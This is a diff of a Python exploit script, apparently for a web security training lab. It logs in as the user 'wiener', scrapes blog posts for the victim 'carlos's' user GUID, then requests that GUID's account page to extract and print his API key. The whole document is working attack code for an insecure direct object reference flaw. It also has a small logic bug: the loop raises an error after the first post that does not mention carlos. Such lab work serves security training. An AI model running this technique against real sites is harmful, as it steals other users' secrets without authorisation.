@@ -23,35 +23,57 @@ def get_csrf_token(url, session):
     csrf = html.find(
         "input", {'name': 'csrf'})['value']
     return csrf
-
+    
 def is_login_successful(url, session):
     login_url = url + "/login"
     csrf_token = get_csrf_token(
-        login_url,
-        session)
-    data = {
-    "csrf" : csrf_token,    
-    "username": "wiener",
-    "password": "peter"}
+        login_url, session)
+    data_login = {
+        "username": "wiener",
+        "password": "peter",
+        "csrf" : csrf_token
+    }
     response = session.post(
-         login_url,
-         data=data,
-         verify=False,
-         proxies=proxies)
-    return "Log out" in response.text
-
-def get_carlos_api_key(url, session):
-    carlos_url = url + "/my-account?id=carlos"
-    response = session.get(
-        carlos_url,
+        login_url,
+        data=data_login,
         verify=False,
         proxies=proxies
     )
-    api_key = (re.search(
-        "Your API Key is:(.*)", response.text)
-            .group(1)
-            .split('</div>')[0])
-    return api_key
+    return "Log out" in response.text
+
+def get_carlos_guid(url, session):
+    response = requests.get(
+        url,
+        verify=False,
+        proxies=proxies
+    )
+    post_ids = list(set(
+        re.findall(r'postId=(\w+)"', response.text)))
+    for id in post_ids:
+        response = session.get(
+            url + "/post?postId=" + id,
+            verify=False,
+            proxies=proxies
+        )
+        if 'carlos' in response.text:
+            guid = re.findall(
+                r"userId=(.*)'", response.text)[0]
+            return guid
+        raise ValueError("Carlos' GUID not found")
+    
+def get_carlos_api_key(url, session, guid):
+    carlos_account_url = (
+        url + "/my-account?id=" + guid)
+    response = session.get(
+        carlos_account_url,
+        verify=False,
+        proxies=proxies
+    )
+    if 'carlos' in response.text:
+        api_key = re.findall(
+            r'Your API Key is:(.*)\<\/div>', response.text)
+        return api_key[0]
+    raise ValueError("Carlos' API not found")
 
 if __name__ == "__main__":
     try:
@@ -61,7 +83,8 @@ if __name__ == "__main__":
         if not is_login_successful(url, session):
             print("[-] Login was not successful.")
             sys.exit(FAIL)
-        api_key = get_carlos_api_key(url, session)
+        guid = get_carlos_guid(url, session)
+        api_key = get_carlos_api_key(url, session, guid)
         print("[+] Carlos' API Key is %s" % api_key)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
